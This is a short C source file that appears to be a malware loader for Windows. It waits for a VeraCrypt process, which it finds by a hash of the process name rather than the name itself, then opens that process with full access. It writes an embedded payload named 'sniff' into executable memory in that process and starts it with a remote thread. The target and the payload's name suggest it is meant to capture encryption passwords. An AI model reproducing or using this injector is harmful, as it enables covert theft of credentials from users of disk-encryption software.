#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>

#define UTILS_IMPLEMENTATION
#include "../c_utils/utils.h"

extern DWORD ExecuteRemoteThread64(HANDLE hTargetProc, LPVOID lpvRemotePayloadMem, PHANDLE hThread);

int main(void)
{
    DWORD64 dwVeraCryptHash = 0x10e06b649;

    DWORD dwProcID = -1;
    while (1)
    {
        dwProcID = UtilsFindTargetProcessIDByHash(dwVeraCryptHash);

        if (dwProcID != -1)
        {
            break;
        }

        UtilsSleep(5000);
    }

    HANDLE hTargetProc = UtilsOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcID);
    if (hTargetProc == NULL)
    {
        return 0;
    }

#include "sniff.x64.bin.h"

    LPVOID lpvRemotePayloadMem = UtilsVirtualAllocEx(hTargetProc, NULL, sniff_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpvRemotePayloadMem == NULL)
    {
        goto shutdown;
    }

    if (!UtilsWriteProcessMemory(hTargetProc, lpvRemotePayloadMem, sniff_data, sniff_data_len, NULL))
    {
        goto shutdown;
    }

    HANDLE hThread = NULL;
    ExecuteRemoteThread64(hTargetProc, lpvRemotePayloadMem, &hThread);
    if (hThread != NULL)
    {
        UtilsResumeThread(hThread);
    }

shutdown:
    UtilsCloseHandle(hTargetProc);

    return 0;
}
